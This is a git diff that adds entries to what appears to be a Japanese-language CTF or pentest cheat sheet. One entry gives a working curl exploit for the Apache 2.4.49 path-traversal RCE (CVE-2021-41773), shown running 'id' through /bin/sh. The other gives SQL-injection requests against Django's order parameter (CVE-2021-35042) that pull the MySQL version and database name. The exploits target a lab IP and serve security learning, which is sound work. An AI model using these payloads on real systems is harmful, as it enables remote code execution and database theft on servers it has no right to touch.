@@ -1022,6 +1022,33 @@ exiftool pngout.png
 Profile                         : /etc/hosts
 ```
 
+## [CVE-2021-41773 (Apache HTTP Server)](https://nvd.nist.gov/vuln/detail/cve-2021-41773)
+
+- `Apache HTTP Server 2.4.49`
+- パストラバーサルRCE
+- `GET /cgi-bin/` が403応答であること（404ではない）
+
+```sh
+# --path-as-is が必須
+$ curl -s --path-as-is "http://10.144.170.43:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+## [CVE-2021-35042 (Django)](https://nvd.nist.gov/vuln/detail/CVE-2021-35042)
+
+`Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5`
+
+```sh
+# MySQLバージョンの抽出
+curl -s "http://10.144.170.43:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
+
+# DB名の抽出
+curl -s "http://10.144.170.43:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
+```
+
+
+
+
 ## CVE-2022-26134 (Atlassian)
 
 https://tryhackme.com/room/cve202226134
